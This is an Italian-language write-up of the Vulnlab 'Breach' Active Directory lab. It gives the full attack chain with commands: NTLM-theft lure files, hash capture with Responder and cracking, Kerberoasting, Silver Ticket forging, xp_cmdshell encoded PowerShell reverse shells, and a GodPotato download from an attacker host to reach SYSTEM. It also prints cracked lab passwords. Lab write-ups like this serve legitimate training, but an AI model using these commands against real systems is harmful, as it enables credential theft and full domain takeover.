+++
date = '2026-07-08T17:27:11+02:00'
draft = false
title = 'Breach Writeup IT'
+++
**Nome**: **`joy.scd01`**

**Data**: **`08/06/2026`**

![Breach.png](/images/imgs_breach/Breach.png)

---
# Introduzione

**_Breach_** è un ambiente **Active Directory** di livello **Medium** creato da **Vulnlab** che simula un percorso di attacco altamente realistico, partendo da una semplice share di rete mal configurata per arrivare alla compromissione totale del sistema tramite la manipolazione dei ticket **Kerberos**.

Il punto di accesso iniziale si basa sulla scoperta di una share **SMB** scrivibile da chiunque. Caricando file malevoli generati tramite **NTLM Theft**, ho costretto la macchina di un utente ad autenticarsi al mio server **SMB** malevolo, catturando il suo **hash NetNTLMv2**. Dopo averlo craccato, ho utilizzato l'account compromesso per eseguire un attacco di **Kerberoasting** contro un account di servizio **MSSQL**.
Con la password dell'account di servizio, ho forgiato un **Silver Ticket** per ottenere accesso amministrativo al database, estraendo entrambe le flag. Infine, non soddisfatto delle sole flag, ho abilitato **`xp_cmdshell`** per lanciare una reverse shell e ho sfruttato il **`SeImpersonatePrivilege`** tramite **GodPotato** per ottenere il controllo completo del sistema.

---
# Tecniche Utilizzate

- **Cattura NTLM hash (NTLM Theft)**

- **Kerberoasting**

- **Attacco Silver Ticket**

- **MSSQL Exploitation**

- **Token Impersonation via Attacco GodPotato** 

---
# Enumerazione

## nmap 

Scansione iniziale di tutte le porte:

```bash
nmap -p- -Pn breach
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49677/tcp open  unknown
49919/tcp open  unknown
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV -Pn breach 
```

```text
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-06-08 08:06:34Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-08T08:06:39+00:00
|_ssl-date: 2026-06-08T08:07:18+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Issuer: commonName=BREACHDC.breach.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-07T08:04:56
| Not valid after:  2026-12-07T08:04:56
| MD5:     5435 77ce c801 dfac ff50 ad9e ec0e 23d8
| SHA-1:   0b3e f543 d1fc 18de 87c8 05ea 3bf1 f132 3f2b eedd
| SHA-256: 65a5 695d adfa 2a4e 15fe ce25 a9d8 89ee 8032 a2f8 fa6e dbf6 1ee5 8211 4cce f873
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-08T08:06:41
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 47018/tcp): CLEAN (Timeout)
|   Check 2 (port 27693/tcp): CLEAN (Timeout)
|   Check 3 (port 18169/udp): CLEAN (Timeout)
|   Check 4 (port 57375/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
```

**Porte Aperte**:
- **53**/tcp - DNS

- **80**/tcp - HTTP

- **88**/tcp - Kerberos

- **135**/tcp - MSRPC

- **139**/tcp - netbios-ssn

- **389**/tcp - LDAP

- **445**/tcp - microsoft-ds (SMB)

- **464**/tcp - kpasswd5

- **593**/tcp - ncacn_http

- **636**/tcp - ssl/ldap

- **1433**/tcp - ms-sql-s (MSSQL)

- **3268**/tcp - LDAP Global Catalog

- **3269**/tcp - ssl/ldap Global Catalog

- **3389**/tcp - RDP

- **5985**/tcp - WinRM

- **9389**/tcp - ADWS

Ho aggiunto **`breach.vl`** e **`breachdc.breach.vl`** al mio file **`/etc/hosts`**.

# Enumerazione SMB & Information Gathering

Ho iniziato enumerando le share **SMB** per controllare l'accesso anonimo o Guest utilizzando **NetExec**:

```bash
nxc smb breach.vl -u Guest -p '' --shares
```

![smbanon.png](/images/imgs_breach/smbanon.png)

L'output ha rivelato una share non di default chiamata **`share`**. Mi sono connesso ad essa usando **smbclient**:

```bash
smbclient \\\\breach.vl\\share -U Guest
```

![shareshare.png](/images/imgs_breach/shareshare.png)

All'interno della share, ho navigato nella directory **`transfer/`** e ho trovato una userlist, che ho immediatamente scaricato e pulito in un file locale chiamato **`users`**.

Ho tentato un attacco standard di **password spraying** contro il servizio **SMB** utilizzando la userlist estratta, ma non ha prodotto risultati:

```bash
nxc smb breach.vl -u users.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

![brutefail.png](/images/imgs_breach/brutefail.png)

---
# Accesso Iniziale | NTLM Theft & Password Cracking

Durante l'enumerazione della directory **`share`**, mi sono reso conto che la mia sessione Guest aveva **permessi di scrittura**. Questa è una classica misconfiguration che può essere sfruttata per catturare hash.

**Nota**: _Caricando file appositamente creati (come **`.lnk`**, **`.scf`** o **`.url`**) su una share **SMB** pubblica, un attaccante può costringere il processo **Windows Explorer** di qualsiasi utente che si limiti a sfogliare quella cartella ad avviare automaticamente un tentativo di autenticazione contro la macchina dell'attaccante, leakando di fatto il suo **NetNTLMv2 hash**._

Ho fatto una rapida ricerca su **Google** per "**NTLM Theft**" e ho utilizzato il famoso tool di **Greenwolf** per generare i file payload malevoli.

- **https://github.com/Greenwolf/ntlm_theft**

Ho configurato un **ambiente virtuale Python** e installato le dipendenze:

```bash
python3 -m venv venv

source venv/bin/activate

pip3 install xlsxwriter

python3 ntlm_theft.py -g all -s <attacker_ip> -f stars
```

![ntlmtcreation.png](/images/imgs_breach/ntlmtcreation.png)

Successivamente, ho avviato **Responder** sulla mia interfaccia **VPN** per mettermi in ascolto delle richieste di autenticazione in ingresso:

```bash
sudo responder -I tun0
```

Mi sono riconnesso alla share scrivibile e ho caricato tutti i payload generati all'interno della directory **`transfer/`**:

```bash
smbclient \\\\breach.vl\\share -U Guest

cd transfer

mput *
```

Dopo una breve attesa, un utente ha sfogliato la cartella e **Responder** ha catturato un **hash NetNTLMv2** per l'utente **`Julia.Wong`**.

![juliantlm.png](/images/imgs_breach/juliantlm.png)

Ho copiato l'hash in un file chiamato **`julia_hash`** e l'ho craccato usando **John The Ripper**:

```bash
john julia_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![juliacrack.png](/images/imgs_breach/juliacrack.png)

---
# Lateral Movement | Kerberoasting & Attacco Silver Ticket

## Kerberoasting

Ora, con delle credenziali valide (**`Julia.Wong:Computer1`**), ho potuto interrogare **Active Directory** alla ricerca di **Service Principal Name** (**SPN**) per eseguire un attacco di **Kerberoasting**.

Ho utilizzato **`GetUserSPNs.py`** di **Impacket**:

```bash
pip3 install impacket

GetUserSPNs.py breach.vl/Julia.Wong:"Computer1" -dc-ip breach.vl
```

Lo script ha identificato un account di servizio: **`svc_mssql`**. Ho lanciato nuovamente il comando con la flag **`-request`** per estrarre il **Kerberos Ticket Granting Service** (**TGS**):

![mssqltgs.png](/images/imgs_breach/mssqltgs.png)

Ho salvato l'hash in **`krb5tgs`** e l'ho craccato con **John**:

```bash
john krb5tgs --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
```

![mssqlpass.png](/images/imgs_breach/mssqlpass.png)

## Forgiatura Silver Ticket

Trattandosi di un account di servizio non interattivo un tentativo di login diretto sul sistema (ad esempio tramite **WinRM**) non avrebbe portato a nulla. Quindi ho optato per un attacco **Silver Ticket**.

**Nota**: _Un **Silver Ticket** è un **TGS** (**Ticket Granting Service**) contraffatto generato offline dall'attaccante. Poiché il **TGS** è criptato utilizzando l'**NT hash** dell'account di servizio, possiamo forgiare un ticket valido per quel servizio specifico, garantendoci un accesso di livello **Domain Admin** su di esso, senza mai interagire con il **Domain Controller**._

Per forgiare il ticket, avevo bisogno di due cose:

- **Il SID del Dominio**.

- **L'NT Hash della password di `svc_mssql` (Trustno1)**.

Ho recuperato il **SID** del Dominio utilizzando **`lookupsid.py`** di **Impacket**:

```bash
lookupsid.py "svc_mssql:Trustno1"@breach.vl
```

![sid.png](/images/imgs_breach/sid.png)

Quindi, ho utilizzato [Code Beautify](https://codebeautify.org/ntlm-hash-generator), un convertitore online per generare l'**NT Hash** della stringa **Trustno1**.

![converted.png](/images/imgs_breach/converted.png)

Utilizzando **`ticketer.py`** di **Impacket**, ho forgiato il **Silver Ticket** per il servizio **MSSQL**, iniettando esplicitamente il **`RID 500`** (**Domain Administrator**):

```bash
impacket-ticketer -nthash <converted_nt_hash> -domain-sid <DOMAIN_SID> -domain breach.vl -spn "MSSQL/BREACH.VL:1433@BREACH.VL" -user-id 500 Administrator
```

![ticket.png](/images/imgs_breach/ticket.png)

Ho esportato il file **`.ccache`** risultante nelle mie variabili d'ambiente:

```bash
export KRB5CCNAME=Administrator.ccache
```

Infine, mi sono connesso al database utilizzando l'autenticazione **Kerberos**:

```bash
impacket-mssqlclient -k -no-pass breach.vl -windows-auth
```

![mssqladmin.png](/images/imgs_breach/mssqladmin.png)

Ho cercato su **Google** la query **MSSQL** corretta per leggere file locali e ho utilizzato la funzione **`OPENROWSET`** per recuperare sia la **user** che la **root flag** direttamente dal prompt del database:

```bash
SELECT * FROM OPENROWSET(BULK N'C:\share\transfer\julia.wong\user.txt', SINGLE_CLOB) AS Contents;
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
```

![userflag.png](/images/imgs_breach/userflag.png)

![rootflag.png](/images/imgs_breach/rootflag.png)

A questo punto, la macchina era tecnicamente completata. Ma come sempre, volevo il pieno controllo sul sistema sottostante, non solo sull'istanza del database.

---
# Compromissione Totale | xp_cmdshell & Attacco GodPotato

Dal prompt di **`mssqlclient`**, ho abilitato l'opzione avanzata **`xp_cmdshell`**, che permette l'esecuzione di comandi di sistema tramite query **SQL**:

```bash
EXEC sp_configure 'show advanced options', 1;

RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;

RECONFIGURE;
```

Ho recuperato un payload per una reverse shell in **Powershell** codificata in **base64** (la classica che si può trovare su **[Revshell Generator](https://www.revshells.com/))** e l'ho eseguito:

```bash
EXEC xp_cmdshell 'powershell -exec bypass -enc <BASE64_PAYLOAD>';
```

![revshell.png](/images/imgs_breach/revshell.png)

Ho intercettato la shell sul mio listener **Netcat**, come utente **`svc_mssql`**.

![initialaccess.png](/images/imgs_breach/initialaccess.png)

Ho controllato i privilegi:

```powershell
whoami /priv
```

![impersonate.png](/images/imgs_breach/impersonate.png)

Ho notato che il **`SeImpersonatePrivilege`** era abilitato.

**Nota**: _Il **`SeImpersonatePrivilege`** consente a un processo di impersonare qualsiasi **access token** di cui riesca a impossessarsi. È incredibilmente comune sugli account di servizio (come **IIS** o **MSSQL**) ed è una privilege escalation verticale garantita._

Ho navigato in **`C:\Users\svc_mssql\Desktop`** e scaricato **[GodPotato](https://github.com/BeichenDream/GodPotato)**, uno strumento per sfruttare esattamente questo privilegio:

```bash
iwr -uri http://<ATTACKER_IP>:8000/GodPotato-NET4.exe -Outfile patata.exe
```

Ho eseguito **`patata.exe`**, istruendolo a lanciare un altro payload reverse shell codificato in **Base64**:

```bash
.\patata.exe -cmd "powershell -exec bypass -enc <BASE64_PAYLOAD_2>"
```

Sul mio secondo listener **Netcat**, ho ricevuto una connessione.

![systemproof.png](/images/imgs_breach/systemproof.png)

**Sistema compromesso**.

---
# Considerazioni Finali 

**_Breach_** è una macchina eccezionale che incatena perfettamente alcuni degli exploit per **Active Directory** più soddisfacenti.

La fase di accesso iniziale è un esempio di come una misconfiguration apparentemente innocua (una share pubblica scrivibile) possa portare a conseguenze devastanti se combinata con **NTLM Theft**. È un **Low-Hanging Fruit** estremamente comune negli scenari reali.

La fase di lateral movement illustra il potere di un attacco **Silver Ticket**. Forgiare il ticket per impersonare l'**amministratore** di Dominio mi ha permesso di bypassare qualsiasi restrizione locale del database.
Spingersi oltre per evadere dall'ambiente **MSSQL** tramite **`xp_cmdshell`** ed escalare a **SYSTEM** tramite **`SeImpersonate`** è stato un ottimo esercizio per comprendere la metodologia e la mentalità dietro le operazioni **Red Team** reali.

**Fonti**:

- **NTLM Theft (Greenwolf) | https://github.com/Greenwolf/ntlm_theft**

- **Silver Ticket Attack | https://www.youtube.com/watch?v=KngApymmV60&list=PLJnLaWkc9xRi71Pso26JlvyBkLUOETLjn&index=8**

- **Code Beautify | https://codebeautify.org/ntlm-hash-generator**

- **Revshell Generator | https://www.revshells.com/**

- **MSSQL OPENROWSET Trick | https://stackoverflow.com/questions/2007857/reading-a-text-file-with-sql-server**

- **GodPotato | https://github.com/BeichenDream/GodPotato**